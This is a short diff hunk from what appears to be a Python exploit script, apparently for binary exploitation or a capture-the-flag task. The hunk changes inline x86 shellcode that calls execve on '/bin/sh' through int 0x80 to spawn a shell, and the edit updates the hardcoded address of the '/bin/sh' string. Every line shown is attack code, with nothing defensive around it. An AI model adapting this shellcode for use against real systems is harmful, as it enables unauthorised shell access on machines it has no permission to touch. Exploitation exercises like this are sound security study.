@@ -36,7 +36,7 @@ input('Execute shell')
 
 """
 mov %al, 0xb
-mov %ebx, 0x40406d #address of /bin/sh\x00
+mov %ebx, 0x404075 #address of /bin/sh\x00
 xor %ecx, %ecx
 xor %edx, %edx
 int 0x80
